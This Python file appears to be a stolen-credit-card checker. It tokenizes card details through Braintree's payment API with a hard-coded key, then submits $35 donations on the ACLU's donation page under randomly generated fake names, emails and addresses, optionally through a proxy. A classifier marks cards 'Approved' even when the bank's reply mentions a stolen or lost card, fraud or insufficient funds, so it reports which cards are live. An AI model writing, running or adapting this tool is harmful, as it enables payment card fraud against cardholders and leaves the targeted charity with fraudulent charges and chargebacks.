import httpx
import re
import random
import string
import time
import json


BT_GQL = "https://payments.braintree-api.com/graphql"
BT_KEY = "production_5vk7wvxb_y4td3k9mvg99sh6z"
DONATE_URL = "https://www.aclu.org/give/now"
SUBMIT_URL = "https://www.aclu.org/give/now"
FORM_ID = "webform_client_form_58508"
AMOUNT = "35"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

TOKENIZE_QUERY = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard {
      bin
      brandCode
      last4
      binData {
        prepaid
        healthcare
        debit
        durbinRegulated
        commercial
        payroll
        issuingBank
        countryOfIssuance
        productId
      }
    }
  }
}
""".strip()

FIRST_NAMES = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel",
               "Matthew", "Andrew", "Joseph", "Richard", "Steven", "Kevin", "Brian", "Edward", "Mark", "Paul"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies", "Evans", "Thomas",
              "Roberts", "Walker", "Wright", "Clark", "Hall", "Young", "King", "Green", "Baker", "Hill"]
US_ADDRESSES = [
    ("123 Main St", "New York", "NY", "10001"),
    ("456 Oak Ave", "Los Angeles", "CA", "90001"),
    ("789 Pine Rd", "Chicago", "IL", "60601"),
    ("321 Elm St", "Houston", "TX", "77001"),
    ("654 Maple Dr", "Phoenix", "AZ", "85001"),
    ("987 Cedar Ln", "Philadelphia", "PA", "19101"),
    ("147 Birch Way", "San Antonio", "TX", "78201"),
    ("258 Walnut Ct", "San Diego", "CA", "92101"),
    ("369 Spruce Blvd", "Dallas", "TX", "75201"),
    ("741 Ash Pl", "Miami", "FL", "33101"),
    ("852 Poplar St", "Atlanta", "GA", "30301"),
    ("963 Willow Ave", "Boston", "MA", "02101"),
]


def _rand_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=11)) + "@gmail.com"


def _rand_identity():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    addr = random.choice(US_ADDRESSES)
    email = _rand_email()
    return first, last, email, addr


def _parse_card_info(card_info):
    brand = card_info.get("brandCode", "UNKNOWN")
    last4 = card_info.get("last4", "????")
    bdata = card_info.get("binData", {})
    country = bdata.get("countryOfIssuance", "??")
    bank = bdata.get("issuingBank", "Unknown")
    debit = bdata.get("debit", "UNKNOWN")
    prepaid = bdata.get("prepaid", "UNKNOWN")
    card_type = "DEBIT" if debit == "YES" else ("PREPAID" if prepaid == "YES" else "CREDIT")
    return f"{card_info.get('bin', '??????')} | {brand} {card_type} | {country} | {bank} | {last4}"


def _classify(msg):
    low = msg.lower()
    live_kw = [
        "insufficient funds", "do not honor", "do_not_honor",
        "lost card", "lost_card", "stolen card", "stolen_card",
        "pickup card", "pickup_card", "restricted card", "restricted_card",
        "security violation", "cvv", "cvc", "security code",
        "avs", "incorrect zip", "incorrect_zip",
        "card velocity", "withdrawal count", "exceeds withdrawal",
        "fraud", "risk", "review", "authentication",
        "3d secure", "3ds", "limit exceeded", "limit_exceeded",
        "not sufficient", "activity limit", "exceeds limit",
        "try again", "contact your bank", "call your bank",
        "declined by the bank",
    ]
    for k in live_kw:
        if k in low:
            return "Approved"

    dead_kw = [
        "invalid card", "invalid account", "expired card", "expired_card",
        "card not supported", "not permitted", "transaction not allowed",
        "generic_decline", "generic decline",
        "processor declined", "do not try again",
        "card number is not", "invalid payment",
    ]
    for k in dead_kw:
        if k in low:
            return "Declined"

    if "decline" in low:
        return "Declined"
    return "Declined"


async def braintree_premium_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        yy_full = f"20{yy}"
    else:
        yy_full = yy
    mm = mm.zfill(2)

    first, last, email, (street, city, state, zipcode) = _rand_identity()

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    client_kwargs = dict(
        timeout=httpx.Timeout(40.0),
        max_redirects=10,
        headers=headers,
        follow_redirects=True,
    )
    if proxy:
        client_kwargs["proxy"] = proxy

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            bt_headers = {
                "authorization": f"Bearer {BT_KEY}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "referer": "https://assets.braintreegateway.com/",
                "user-agent": UA,
            }

            session_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
            tok_payload = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "dropin2",
                    "sessionId": session_id,
                },
                "query": TOKENIZE_QUERY,
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mm,
                            "expirationYear": yy_full,
                            "cvv": cvv,
                        },
                        "options": {"validate": False},
                    }
                },
            }

            r_tok = await client.post(BT_GQL, headers=bt_headers, json=tok_payload)

            if r_tok.status_code != 200:
                elapsed = round(time.time() - start, 2)
                return f"Error - Tokenization HTTP {r_tok.status_code} [{elapsed}s]"

            tok_data = r_tok.json()
            if "errors" in tok_data and tok_data["errors"]:
                elapsed = round(time.time() - start, 2)
                err_msg = tok_data["errors"][0].get("message", "Tokenization failed")
                return f"Declined - {err_msg} [{elapsed}s]"

            cc_data = tok_data.get("data", {}).get("tokenizeCreditCard", {})
            if not cc_data or not cc_data.get("token"):
                elapsed = round(time.time() - start, 2)
                return f"Error - No token returned [{elapsed}s]"

            nonce = cc_data["token"]
            card_info = cc_data.get("creditCard", {})
            info = _parse_card_info(card_info) if card_info else "??"

            r_page = await client.get(DONATE_URL)
            page_text = r_page.text

            fb_match = re.search(r'name="form_build_id"\s+value="([^"]+)"', page_text)
            if not fb_match:
                elapsed = round(time.time() - start, 2)
                return f"Error - Could not get form token [{elapsed}s]"

            form_build_id = fb_match.group(1)

            card_brand = (card_info.get("brandCode") or "Visa").capitalize()

            form_data = {
                "submitted[donation][recurs_monthly]": "NO_RECURR",
                "submitted[donation][amount]": AMOUNT,
                "submitted[donation][other_amount]": "",
                "submitted[donation][recurring_other_amount]": "",
                "submitted[donor_information][first_name]": first,
                "submitted[donor_information][last_name]": last,
                "submitted[donor_information][mail]": email,
                "submitted[billing_information][address]": street,
                "submitted[billing_information][address_line_2]": "",
                "submitted[billing_information][city]": city,
                "submitted[billing_information][state]": state,
                "submitted[billing_information][zip]": zipcode,
                "submitted[billing_information][country]": "US",
                "submitted[payment_information][payment_method]": "credit",
                "submitted[payment_information][payment_fields][credit][card_number]": "",
                "submitted[payment_information][payment_fields][credit][card_cvv]": "",
                "submitted[payment_information][payment_fields][credit][card_type]": card_brand,
                "submitted[payment_information][payment_fields][credit][session_id]": session_id,
                "submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_month]": mm,
                "submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_year]": yy_full,
                "submitted[payment_information][processing_fee][1]": "",
                "submitted[payment_information][processing_fee_amount]": "0",
                "payment_method_nonce": nonce,
                "braintree[errors]": "",
                "details[page_num]": "1",
                "details[page_count]": "1",
                "details[finished]": "0",
                "form_build_id": form_build_id,
                "form_id": FORM_ID,
                "op": "Submit",
            }

            submit_headers = {
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://www.aclu.org",
                "Referer": DONATE_URL,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }

            r_submit = await client.post(
                SUBMIT_URL,
                data=form_data,
                headers=submit_headers,
            )

            elapsed = round(time.time() - start, 2)
            resp_text = r_submit.text

            if "thank" in resp_text.lower() or str(r_submit.url).endswith("thank-you") or "confirmation" in resp_text.lower():
                return f"Approved - Charged ${AMOUNT} | {info} [{elapsed}s]"

            errors = re.findall(r'class="[^"]*error[^"]*"[^>]*>(.*?)</(?:div|li|span|p)', resp_text, re.DOTALL | re.I)
            if errors:
                for e in errors:
                    clean = re.sub(r"<[^>]+>", "", e).strip()
                    if clean and len(clean) > 5:
                        status = _classify(clean)
                        return f"{status} - {clean[:150]} | {info} [{elapsed}s]"

            msgs = re.findall(r'class="[^"]*(?:messages|alert|status)[^"]*"[^>]*>(.*?)</(?:div|ul)', resp_text, re.DOTALL | re.I)
            if msgs:
                for m in msgs:
                    clean = re.sub(r"<[^>]+>", "", m).strip()
                    if clean and len(clean) > 5:
                        status = _classify(clean)
                        return f"{status} - {clean[:150]} | {info} [{elapsed}s]"

            if r_submit.status_code >= 400:
                return f"Error - HTTP {r_submit.status_code} [{elapsed}s]"

            return f"Approved - Charged ${AMOUNT} | {info} [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network error [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:100]} [{elapsed}s]"
